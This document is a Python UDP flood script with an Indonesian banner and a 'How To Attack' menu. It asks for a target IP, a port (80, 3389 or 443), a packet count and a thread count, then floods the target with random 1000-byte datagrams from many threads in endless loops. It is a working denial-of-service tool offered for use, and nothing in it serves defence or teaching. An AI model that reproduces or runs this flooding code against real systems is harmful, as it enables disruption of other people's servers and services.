# Random banget ngab
# Gabut buat

# Import Module
import socket
import random
import threading


print("▄████  ██▀███  ▓█████ ▓█████ ▒███████▒    ▒██   ██▒     ▄████ ▓█████  ▄▄▄▄    ▄▄▄▄")   
print("██▒ ▀█▒▓██ ▒ ██▒▓█   ▀ ▓█   ▀ ▒ ▒ ▒ ▄▀░   ▒▒ █ █ ▒░    ██▒ ▀█▒▓█   ▀ ▓█████▄ ▓█████▄")
print("▒██░▄▄▄░▓██ ░▄█ ▒▒███   ▒███   ░ ▒ ▄▀▒░    ░░  █   ░   ▒██░▄▄▄░▒███   ▒██▒ ▄██▒██▒ ▄██")
print("░▓█  ██▓▒██▀▀█▄  ▒▓█  ▄ ▒▓█  ▄   ▄▀▒   ░    ░ █ █ ▒    ░▓█  ██▓▒▓█  ▄ ▒██░█▀  ▒██░█▀")  
print("░▒▓███▀▒░██▓ ▒██▒░▒████▒░▒████▒▒███████▒   ▒██▒ ▒██▒   ░▒▓███▀▒░▒████▒░▓█  ▀█▓░▓█  ▀█▓")
print("░▒   ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░░░ ▒░ ░░▒▒ ▓░▒░▒   ▒▒ ░ ░▓ ░    ░▒   ▒ ░░ ▒░ ░░▒▓███▀▒░▒▓███▀▒")
print("░   ░   ░▒ ░ ▒░ ░ ░  ░ ░ ░  ░░░▒ ▒ ░ ▒   ░░   ░▒ ░     ░   ░  ░ ░  ░▒░▒   ░ ▒░▒   ░") 
print("░ ░   ░   ░░   ░    ░      ░   ░ ░ ░ ░ ░    ░    ░     ░ ░   ░    ░    ░    ░  ░    ░") 
print("░    ░        ░  ░   ░  ░  ░ ░        ░    ░           ░    ░  ░ ░       ░")      
print("                             ░                                            ░       ░") 

print("TETAP LAH BANGUNKAN DIRI MU DAN STAY KUAT WALAU DIA TELAH MENINGGALKAN MU:>")


print("╔══════════════════════════════════╗")
print("║ Example How To Attack!           ║")
print("║ 1. Put The IP Target You Want!   ║")
print("║ 2. Then Put The Port 80/3389/443!║")
print("║ 3. AFter That Put Packet You Want║")
print("║ 4. Put Threads How Much You Want!║")
print("║ 5. Then Enter And Susccesfully!  ║")
print("╚══════════════════════════════════╝")

ip = str(input("[+] Enter RDP IP : "))
port = int(input("[+] Enter RDP Port (80/3389/443)   : "))
times = int(input("[+] Enter Packet (BEBAS BANG PAKET SEMAUNYA) : "))
threads = int(input("[+] Enter Thread (BEBAS BANG SEMAU LU) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Sended! ready to fucking tembos!")
        except socket.error:
            s.close()
            print("[!] sended ready to fucking tembos => ",ip," With Port : ",port,"!")
            
def timer(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)
			
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()

